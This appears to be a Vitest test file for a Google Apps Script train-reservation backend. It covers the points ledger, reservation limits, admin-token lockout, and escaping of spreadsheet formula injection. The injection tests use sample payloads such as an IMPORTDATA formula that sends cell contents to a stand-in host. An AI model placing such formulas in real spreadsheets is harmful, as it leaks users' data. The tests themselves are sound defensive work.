// サーバー(gas/Code.gs)のポイントの台帳を、スプレッドシートの代わりの表を使って動かして、調べる。
// Code.gs を、そのまま読み込んで、Google のサービス(シート・ロック・応答)だけを、作りものに差し替える。
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { beforeEach, describe, expect, it } from 'vitest';

type Row = [string, string, string, string, number, string];
// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Gas = Record<string, any>;

const source = fs.readFileSync(path.resolve(__dirname, '..', 'gas', 'Code.gs'), 'utf-8');

let rows: unknown[][] = [];
let gas: Gas;

const loadGas = (): Gas => {
  rows = [['日時', '会員ID', '種別', '名札', 'ポイント', '内容']];
  const sheet = {
    getDataRange: () => ({ getValues: () => rows.map((r) => [...r]) }),
    appendRow: (r: unknown[]) => void rows.push(r),
  };
  const ctx: Gas = {
    Logger: { log: () => undefined },
    LockService: { getScriptLock: () => ({ waitLock: () => undefined, releaseLock: () => undefined }) },
    Utilities: { formatDate: () => '2026/11/02 12:00:00' },
    ContentService: {},
    // 読み込むときに、LINE の設定を読む(テストでは、空)
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => '' }) },
  };
  vm.createContext(ctx);
  vm.runInContext(source, ctx);
  // Google のサービスに触る部分を、作りものに差し替える(中の計算は、本物のまま)
  ctx.createJsonResponse = (d: unknown) => d;
  ctx.getOrCreateSheetWithHeaders = () => sheet;
  ctx.authMember = (token: string) =>
    token === 'ok' ? { memberId: 'M1' } : { error: { status: 'error', code: 'session' } };
  return ctx;
};

// 台帳に、1行足す(最初の同期が済んだ状態は、'welcome' の行がある状態)
const put = (kind: string, key: string, points: number, memberId = 'M1') =>
  rows.push(['2026/11/02 12:00:00', memberId, kind, key, points, 'テスト'] as Row);

const balance = (memberId = 'M1') =>
  Math.max(0, rows.slice(1).filter((r) => r[1] === memberId).reduce((s, r) => s + (r[4] as number), 0));

beforeEach(() => {
  gas = loadGas();
});

describe('ポイントを使う(spendPoints)', () => {
  it('残高から引いて、台帳に「使った」行を足す', () => {
    put('welcome', 'welcome', 1000);
    const r = gas.handleSpendPoints('ok', 'EQ-1', 300, 'お支払い');
    expect(r).toMatchObject({ status: 'success', spent: 300, balance: 700, added: true });
    expect(rows[rows.length - 1].slice(1, 5)).toEqual(['M1', 'spend', 'use:EQ-1', -300]);
  });

  it('同じ予約番号は、1回だけ。通信のやり直しで、二重に引かれない', () => {
    put('welcome', 'welcome', 1000);
    gas.handleSpendPoints('ok', 'EQ-1', 300, 't');
    const again = gas.handleSpendPoints('ok', 'EQ-1', 300, 't');
    expect(again).toMatchObject({ status: 'success', added: false, balance: 700 });
    expect(balance()).toBe(700);
  });

  it('予約番号が違えば、別々に引く(デリバリーの分など)', () => {
    put('welcome', 'welcome', 1000);
    gas.handleSpendPoints('ok', 'EQ-1', 300, 't');
    const r = gas.handleSpendPoints('ok', 'EQ-1-Dabc', 200, 't');
    expect(r).toMatchObject({ status: 'success', balance: 500 });
  });

  it('残高が足りなければ、引かない', () => {
    put('welcome', 'welcome', 100);
    const r = gas.handleSpendPoints('ok', 'EQ-1', 101, 't');
    expect(r).toMatchObject({ status: 'error', insufficient: true, balance: 100 });
    expect(balance()).toBe(100);
    expect(rows.length).toBe(2);
  });

  it('残高ちょうどまでは使える(残り0)', () => {
    put('welcome', 'welcome', 100);
    expect(gas.handleSpendPoints('ok', 'EQ-1', 100, 't')).toMatchObject({ status: 'success', balance: 0 });
  });

  it('おかしな指定は、断る(0・マイナス・数でない・予約番号の文字)', () => {
    put('welcome', 'welcome', 1000);
    [0, -5, NaN, 'abc', undefined].forEach((p) => expect(gas.handleSpendPoints('ok', 'EQ-1', p, 't').status).toBe('error'));
    ['', 'a b', 'EQ_1', 'x'.repeat(41), '<script>'].forEach((id) =>
      expect(gas.handleSpendPoints('ok', id, 10, 't').status, `予約番号 ${id}`).toBe('error')
    );
    expect(balance()).toBe(1000);
  });

  it('ログインの有効期限が切れていれば、断る', () => {
    put('welcome', 'welcome', 1000);
    expect(gas.handleSpendPoints('bad', 'EQ-1', 10, 't')).toMatchObject({ status: 'error', code: 'session' });
    expect(balance()).toBe(1000);
  });

  it('最初の同期(端末のポイントの引き継ぎ)の前は、引かない', () => {
    const r = gas.handleSpendPoints('ok', 'EQ-1', 10, 't');
    expect(r.status).toBe('error');
    expect(rows.length).toBe(1);
  });

  it('ほかの会員の残高は、使えない', () => {
    put('welcome', 'welcome', 1000, 'M2');
    put('welcome', 'welcome', 50, 'M1');
    expect(gas.handleSpendPoints('ok', 'EQ-1', 100, 't')).toMatchObject({ status: 'error', insufficient: true });
    expect(balance('M2')).toBe(1000);
  });
});

describe('予約で付くポイント(3%・最低50pt)', () => {
  it('新しい予約: 合計の3%。最低50pt', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, '特急あやみ 1号');
    expect(rows[rows.length - 1].slice(2, 5)).toEqual(['reservation', 'reservation:EQ-1', 90]);
    gas.awardReservationPoints('M1', 'EQ-2', 1000, null, '特急あやみ 2号');
    expect(rows[rows.length - 1].slice(3, 5)).toEqual(['reservation:EQ-2', 50]);
  });

  it('ぜんぶポイントで払った(合計0円)ときは、付かない', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 0, null, 't');
    expect(rows.length).toBe(2);
  });

  it('同じ予約の再送では、二重に付かない', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, 't');
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, 't');
    expect(rows.length).toBe(3);
  });

  it('デリバリーを足したときは、増えた金額の分だけ付く。金額が変わらなければ、付かない', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, 't');
    gas.awardReservationPoints('M1', 'EQ-1', 5000, 3000, 't');
    expect(rows[rows.length - 1].slice(2, 5)).toEqual(['delivery', 'delivery:EQ-1:1', 60]);
    const n = rows.length;
    gas.awardReservationPoints('M1', 'EQ-1', 5000, 5000, 't');
    expect(rows.length).toBe(n);
  });

  it('最初の同期の前は、付かない', () => {
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, 't');
    expect(rows.length).toBe(1);
  });
});

describe('デリバリーを足したときのポイント(増えた金額の3%。最低50ptは、なし)', () => {
  const added = (previous: number, next: number) => {
    gas.awardReservationPoints('M1', 'EQ-1', next, previous, 't');
    return rows[rows.length - 1];
  };

  it('少額の追加は、3%だけ(450円で13pt)。最低50ptには、ならない', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 900, null, 't'); // 新しい予約は、最低50pt
    expect(rows[rows.length - 1].slice(3, 5)).toEqual(['reservation:EQ-1', 50]);
    expect(added(900, 1350).slice(2, 5)).toEqual(['delivery', 'delivery:EQ-1:1', 13]);
  });

  it('1,000円は30pt、1,667円は50pt、3,000円は90pt', () => {
    put('welcome', 'welcome', 0);
    expect(added(1000, 2000)[4]).toBe(30);
    expect(added(2000, 3667)[4]).toBe(50);
    expect(added(3667, 6667)[4]).toBe(90);
  });

  it('3%が0ptになる少額(33円)は、行を作らない', () => {
    put('welcome', 'welcome', 0);
    const n = rows.length;
    gas.awardReservationPoints('M1', 'EQ-1', 1033, 1000, 't');
    expect(rows.length).toBe(n);
  });

  it('金額が減った・変わらないときは、付かない(ポイントで払った追加も)', () => {
    put('welcome', 'welcome', 0);
    const n = rows.length;
    gas.awardReservationPoints('M1', 'EQ-1', 2000, 2000, 't');
    gas.awardReservationPoints('M1', 'EQ-1', 1500, 2000, 't');
    expect(rows.length).toBe(n);
  });

  it('少額を何度足しても、最低分は集められない', () => {
    put('welcome', 'welcome', 0);
    let total = 1000;
    for (let i = 0; i < 5; i++) {
      gas.awardReservationPoints('M1', 'EQ-1', total + 450, total, 't');
      total += 450;
    }
    expect(balance()).toBe(13 * 5);
  });

  it('追加を重ねたあとの取り消しで、予約分も追加分も、全部消える', () => {
    put('welcome', 'welcome', 100);
    gas.awardReservationPoints('M1', 'EQ-1', 900, null, 't'); // 50
    gas.awardReservationPoints('M1', 'EQ-1', 1350, 900, 't'); // 13
    gas.awardReservationPoints('M1', 'EQ-1', 2350, 1350, 't'); // 30
    expect(balance()).toBe(100 + 50 + 13 + 30);
    gas.revokeReservationPoints('M1', 'EQ-1');
    expect(balance()).toBe(100);
  });
});

describe('予約を取り消したとき', () => {
  it('付いたポイントは取り消す。使ったポイントは、戻らない', () => {
    put('welcome', 'welcome', 1000);
    gas.handleSpendPoints('ok', 'EQ-1', 500, 't');
    gas.awardReservationPoints('M1', 'EQ-1', 1810, null, 't'); // 54pt
    expect(balance()).toBe(1000 - 500 + 54);
    gas.revokeReservationPoints('M1', 'EQ-1');
    expect(balance()).toBe(1000 - 500); // 付いた54ptだけ消える。使った500ptは戻らない
  });

  it('取り消しを2回しても、二重に引かれない', () => {
    put('welcome', 'welcome', 1000);
    gas.awardReservationPoints('M1', 'EQ-1', 1810, null, 't');
    gas.revokeReservationPoints('M1', 'EQ-1');
    gas.revokeReservationPoints('M1', 'EQ-1');
    expect(balance()).toBe(1000);
  });
});

// ---- シートに書く文字: 式として動かされない ----
// 「=」「+」「-」「@」で始まる文字は、シートが式として動かす。利用者・LINE から来る文字は、先頭に ' を付けて書く。
describe('シートに書く文字(式の注入を防ぐ)', () => {
  const evil = '=IMPORTDATA("https://e.example/"&F2)';

  it('先頭が = + - @ タブ 改行 のときだけ、先頭に \' を付ける', () => {
    ['=1+1', '+1', '-1', '@a', '\tx', '\rx'].forEach((v) => expect(gas.sheetSafe(v), v).toBe("'" + v));
    ['abc', '', '神埼', 'a=b', ' =1', '1', 'EQ-1'].forEach((v) => expect(gas.sheetSafe(v), v).toBe(v));
    expect(gas.sheetSafe(5)).toBe(5);
    expect(gas.sheetSafe(-5)).toBe(-5);
  });

  it('ポイント台帳: タイトルが式でも、式にならずに書かれる(数のポイントは、そのまま)', () => {
    put('welcome', 'welcome', 1000);
    gas.handleSpendPoints('ok', 'EQ-1', 300, evil);
    const last = rows[rows.length - 1];
    expect(last[5]).toBe("'" + evil);
    expect(last[4]).toBe(-300);
  });

  const sheetsFor = (written: unknown[][]) => ({
    getSheetByName: () => null,
    insertSheet: () => ({
      appendRow: (r: unknown[]) => void written.push(r),
      getRange: () => ({ setBackground: () => ({ setFontColor: () => ({ setFontWeight: () => undefined }) }) }),
      setFrozenRows: () => undefined,
    }),
  });

  it('クーポン発行ログ: LINE の userId が式でも、式にならずに書かれる', () => {
    const written: unknown[][] = [];
    gas.getDataSpreadsheet = () => sheetsFor(written);
    gas.logCouponIssue(evil, { courseId: 'c', courseName: 'n', reward: 'r' });
    const row = written.find((r) => r[2] === 'c');
    expect(row?.[1]).toBe("'" + evil);
  });

  it('会員の登録: 表示名・メールが式でも、式にならずに書かれる', () => {
    const written: unknown[][] = [];
    const store: Record<string, string> = {};
    const emailEvil = '=importdata("https://e.example/"&f2&"@a.b")';
    gas.CacheService = {
      getScriptCache: () => ({
        get: (k: string) => store[k] ?? null,
        put: (k: string, v: string) => void (store[k] = v),
        remove: (k: string) => void delete store[k],
      }),
    };
    store['line_otp_ABC234'] = JSON.stringify({ code: '123456', lineUserId: evil });
    gas.findMemberByEmail = () => null;
    gas.getOrCreateMembersSheet = () => ({
      getDataRange: () => ({ getValues: () => [['会員ID']] }),
      appendRow: (r: unknown[]) => void written.push(r),
    });
    gas.Utilities = { ...gas.Utilities, getUuid: () => 'salt' };
    gas.hashPassword = () => 'hash';
    gas.createSessionToken = () => 'tok';
    const r = gas.handleVerifyLineAndRegister(emailEvil, 'Abcd1!', 'ABC234', '123456', evil);
    expect(r.status).toBe('success');
    const row = written[0];
    expect(row[1]).toBe("'" + emailEvil);
    expect(row[3]).toBe("'" + evil);
    expect(row[8]).toBe("'" + evil);
    expect(r.user.name).toBe(evil); // 画面へ返す名前は、元のまま
  });

  it('予約: 列車名・座席などが式でも、式にならずに書かれる(日付と時刻の列は、文字の書式のまま)', () => {
    const written: unknown[][] = [];
    const cells: Record<string, unknown[]> = {};
    const headers = ['予約日時', '予約番号', 'LINE_USER_ID', '列車名', '号車', '座席番号', '席種', '乗車駅', '降車駅', '合計金額', 'ステータス', '会員ID', '予約日', '出発時刻', '到着時刻'];
    gas.verifySessionToken = () => 'M1';
    gas.findMemberById = () => ({ memberId: 'M1', lineUserId: evil });
    gas.getOrCreateReservationsSheet = () => ({
      getDataRange: () => ({ getValues: () => [headers, ...written] }),
      appendRow: (r: unknown[]) => void written.push(r),
      getLastRow: () => written.length + 1,
      getRange: (row: number, col: number) => ({
        setNumberFormat: () => undefined,
        setValue: (v: unknown) => void (cells[`${row},${col}`] = [v]),
        setValues: () => undefined,
      }),
    });
    const r = gas.handleCreateReservation('t', {
      orderId: 'EQ-100', trainName: evil, seatNo: '=A1', seatType: '+x', boardingStation: '@b', destinationStation: '-d',
      totalPrice: 1000, reservedDate: '2026-11-02', departureTime: '10:00', arrivalTime: '11:00',
    }, false);
    expect(r.status).toBe('success');
    const row = written[0] as string[];
    expect(row[headers.indexOf('列車名')]).toBe("'" + evil);
    expect(row[headers.indexOf('座席番号')]).toBe("'=A1");
    expect(row[headers.indexOf('LINE_USER_ID')]).toBe("'" + evil);
    expect(row[headers.indexOf('乗車駅')]).toBe("'@b");
    expect(row[headers.indexOf('降車駅')]).toBe("'-d");
    // 文字の書式の列に、あとから ' が残らないよう、日付・時刻は元の値を書き直す
    expect(cells[`2,${headers.indexOf('予約日') + 1}`]).toEqual(['2026-11-02']);
  });
});

// ---- ポイントの台帳: 申告の金額・くり返しで、水増しできない ----
// ポイントの決まり(3%・最低50pt)は変えない。くり返し・巨額の申告・取消のあとの出し直しで、増やせないことを調べる。
describe('ポイントの水増しを防ぐ(予約の登録・取消)', () => {
  const HEADERS = ['予約日時', '予約番号', 'LINE_USER_ID', '列車名', '号車', '座席番号', '席種', '乗車駅', '降車駅', '合計金額', 'ステータス', '会員ID', '予約日', '出発時刻', '到着時刻'];
  let grid: unknown[][];

  const setupReservations = () => {
    grid = [[...HEADERS]];
    const sheet = {
      getDataRange: () => ({ getValues: () => grid.map((r) => [...r]) }),
      appendRow: (r: unknown[]) => void grid.push([...r]),
      getLastRow: () => grid.length,
      getLastColumn: () => grid[0].length,
      getRange: (row: number, col: number, nr = 1, nc = 1) => ({
        getValues: () => [grid[row - 1].slice(col - 1, col - 1 + nc)],
        setValue: (v: unknown) => void (grid[row - 1][col - 1] = v),
        setValues: (vs: unknown[][]) => vs.forEach((r, i) => r.forEach((v, j) => void (grid[row - 1 + i][col - 1 + j] = v))),
        setNumberFormat: () => undefined,
      }),
    };
    gas.verifySessionToken = () => 'M1';
    gas.findMemberById = () => ({ memberId: 'M1', lineUserId: '' });
    gas.getOrCreateReservationsSheet = () => sheet;
    gas.getDataSpreadsheet = () => ({ getSheetByName: () => sheet });
  };

  const order = (orderId: string, totalPrice: number) => ({
    orderId, trainName: '特急あやみ 1号', carNo: 1, seatNo: '1A', seatType: '指定席', boardingStation: '東京', destinationStation: '大宮',
    totalPrice, reservedDate: '2099-01-01', departureTime: '10:00', arrivalTime: '11:00', items: [], itemDiscount: 0,
  });
  const create = (id: string, total: number, award = true) => gas.handleCreateReservation('t', order(id, total), award);

  beforeEach(() => {
    setupReservations();
    put('welcome', 'welcome', 0);
  });

  it('金額を下げて、また上げても、同じ分のポイントは、二度付かない', () => {
    create('EQ-1', 20000); // 600pt
    expect(balance()).toBe(600);
    create('EQ-1', 100); // 下げる
    create('EQ-1', 20000); // 上げ直す(いままでの最高と同じ)
    expect(balance()).toBe(600);
    create('EQ-1', 30000); // 最高を超えた分(10000円の3%)だけ付く
    expect(balance()).toBe(900);
  });

  it('金額を1円ずつ上げ下げしても、ポイントは増えない', () => {
    create('EQ-1', 1000); // 最低50pt
    for (let i = 0; i < 6; i++) {
      create('EQ-1', 1001 + i);
      create('EQ-1', 1000);
    }
    expect(balance()).toBe(50);
  });

  it('巨額の申告でも、ポイントの計算は10万円まで(予約の記録は、そのまま)', () => {
    create('EQ-1', 1000000);
    expect(balance()).toBe(3000);
    expect(grid[1][HEADERS.indexOf('合計金額')]).toBe(1000000);
  });

  it('10万円を超える申告は、日をまたいでも、10万円までの分しか付かない', () => {
    create('EQ-1', 90000); // 2700pt
    gas.nowText = () => '2026/11/03 12:00:00'; // 翌日(1日の上限に、かからない)
    create('EQ-1', 1000000); // 10万円までの、増えた10000円の3% = 300pt
    expect(balance()).toBe(3000);
  });

  it('1日に予約で付くポイントは、3000ptまで(予約をくり返しても、それ以上は付かない)', () => {
    for (let i = 0; i < 5; i++) create(`EQ-${i + 1}`, 50000); // 1回1500pt
    expect(balance()).toBe(3000);
  });

  it('日が変われば、また付く', () => {
    for (let i = 0; i < 3; i++) create(`EQ-${i + 1}`, 50000);
    expect(balance()).toBe(3000);
    rows.forEach((r, i) => i > 0 && (r[0] = '2026/11/01 12:00:00')); // きのうの分にする
    create('EQ-9', 50000);
    expect(balance()).toBe(4500);
  });

  it('取り消した予約は、同じ予約番号で出し直せない(取消のあとの出し直しで、ポイントを残せない)', () => {
    create('EQ-1', 1000);
    gas.handleCancelReservation('t', 'EQ-1', true);
    expect(balance()).toBe(0);
    for (let i = 0; i < 3; i++) {
      expect(create('EQ-1', 2000 + i)).toMatchObject({ status: 'error' });
      gas.handleCancelReservation('t', 'EQ-1', true);
    }
    expect(balance()).toBe(0);
  });

  it('公開前のアプリ(ポイントに触れない呼び出し)は、これまでどおり出し直せて、予約の数も縛られない', () => {
    create('EQ-1', 1000, false);
    gas.handleCancelReservation('t', 'EQ-1', false);
    expect(create('EQ-1', 1000, false)).toMatchObject({ status: 'success' });
    for (let i = 0; i < 25; i++) expect(create(`EQ-X${i}`, 1000, false).status).toBe('success');
    expect(rows.length).toBe(2); // 台帳には触れない
  });

  it('まだ乗っていない予約は、1会員20件まで。取り消すか乗車後なら、また取れる', () => {
    for (let i = 0; i < 20; i++) expect(create(`EQ-${100 + i}`, 1000).status).toBe('success');
    expect(create('EQ-999', 1000)).toMatchObject({ status: 'error' });
    expect(create('EQ-100', 1500).status).toBe('success'); // 持っている予約の更新は、数えない
    gas.handleCancelReservation('t', 'EQ-101', true);
    expect(create('EQ-999', 1000).status).toBe('success');
  });
});

// ---- 管理トークン: 管理者画面を開く前の確認と、失敗の回数制限 ----
describe('管理トークン(verifyAdminToken・setDisruptions)', () => {
  const KEY = 'correct-horse-battery';
  let cache: Record<string, string>;
  let props: Record<string, string>;
  let lockFails: boolean;
  let saved: unknown[];

  beforeEach(() => {
    cache = {};
    props = { ADMIN_TOKEN: KEY };
    lockFails = false;
    saved = [];
    gas.CacheService = {
      getScriptCache: () => ({
        get: (k: string) => cache[k] ?? null,
        put: (k: string, v: string) => void (cache[k] = v),
        remove: (k: string) => void delete cache[k],
      }),
    };
    gas.LockService = {
      getScriptLock: () => ({
        waitLock: () => {
          if (lockFails) throw new Error('busy');
        },
        releaseLock: () => undefined,
      }),
    };
    gas.PropertiesService = {
      getScriptProperties: () => ({
        getProperty: (k: string) => props[k] ?? '',
        setProperty: (k: string, v: string) => void ((props[k] = v), saved.push(k)),
      }),
    };
  });

  it('正しい管理トークンは通る', () => {
    expect(gas.handleVerifyAdminToken(KEY)).toEqual({ status: 'success' });
  });

  it('違うトークン・空・文字でないものは、断る(code: admin)', () => {
    [KEY + 'x', KEY.slice(0, -1), '', 'x'.repeat(5000), undefined, null, 123, [KEY], { a: 1 }].forEach((t) => {
      cache = {};
      expect(gas.handleVerifyAdminToken(t), String(t)).toMatchObject({ status: 'error', code: 'admin' });
    });
  });

  it('サーバーにトークンが設定されていなければ、空のトークンでも通さない', () => {
    props = {};
    expect(gas.handleVerifyAdminToken('')).toMatchObject({ status: 'error', code: 'admin' });
    expect(gas.handleVerifyAdminToken(undefined)).toMatchObject({ status: 'error', code: 'admin' });
  });

  it('5回続けて失敗すると、正しいトークンでも、しばらく断る(code: admin_locked)', () => {
    for (let i = 0; i < 5; i++) expect(gas.handleVerifyAdminToken('bad' + i)).toMatchObject({ code: 'admin' });
    expect(gas.handleVerifyAdminToken(KEY)).toMatchObject({ status: 'error', code: 'admin_locked' });
  });

  it('4回失敗して、5回目に成功すれば、回数は消える', () => {
    for (let i = 0; i < 4; i++) gas.handleVerifyAdminToken('bad' + i);
    expect(gas.handleVerifyAdminToken(KEY)).toEqual({ status: 'success' });
    for (let i = 0; i < 4; i++) expect(gas.handleVerifyAdminToken('bad' + i)).toMatchObject({ code: 'admin' });
    expect(gas.handleVerifyAdminToken(KEY)).toEqual({ status: 'success' });
  });

  it('同じ時刻に送られても、数え漏れない(数えるところは、ロックの中。ロックを取れなければ通さない)', () => {
    lockFails = true;
    expect(gas.handleVerifyAdminToken(KEY)).toMatchObject({ status: 'error', code: 'admin_busy' });
    expect(gas.handleSetDisruptions({ a: 1 }, [], KEY)).toMatchObject({ status: 'error', code: 'admin_busy' });
    expect(saved).toEqual([]);
  });

  it('ロックを待っているあいだに、ほかの失敗で上限に届いたら、ロックの中で確かめ直して断る', () => {
    let reads = 0;
    gas.CacheService = {
      getScriptCache: () => ({
        get: () => (++reads === 1 ? '4' : '5'), // 1回目(ロックの前)は4回、ロックの中では、もう5回
        put: () => undefined,
        remove: () => undefined,
      }),
    };
    expect(gas.handleVerifyAdminToken(KEY)).toMatchObject({ status: 'error', code: 'admin_locked' });
  });

  it('止めているあいだは、ロックを待たずに断る(連打でロックを塞がせない)', () => {
    cache['admin_token_fail'] = '5';
    lockFails = true; // ロックを取ろうとすれば、busy になるはず
    expect(gas.handleVerifyAdminToken(KEY)).toMatchObject({ code: 'admin_locked' });
  });

  it('運行情報の保存(setDisruptions)も、同じ回数制限を使う', () => {
    for (let i = 0; i < 3; i++) gas.handleVerifyAdminToken('bad' + i);
    for (let i = 0; i < 2; i++) expect(gas.handleSetDisruptions({ a: 1 }, [], 'bad')).toMatchObject({ code: 'admin' });
    expect(gas.handleSetDisruptions({ a: 1 }, [], KEY)).toMatchObject({ status: 'error', code: 'admin_locked' });
    expect(saved).toEqual([]);
  });

  it('正しいトークンなら、運行情報を保存できる(これまでどおり)', () => {
    expect(gas.handleSetDisruptions({ kanzaki: { statusType: 'delay' } }, [], KEY)).toEqual({ status: 'success' });
    expect(saved).toEqual(['OPERATION_DISRUPTIONS']);
  });

  it('doPost の verifyAdminToken は、トークンだけを確かめる(何も書き換えない)', () => {
    gas.ContentService = {};
    const out = gas.doPost({ postData: { contents: JSON.stringify({ action: 'verifyAdminToken', adminToken: KEY }) } });
    expect(out).toEqual({ status: 'success' });
    expect(saved).toEqual([]);
  });
});
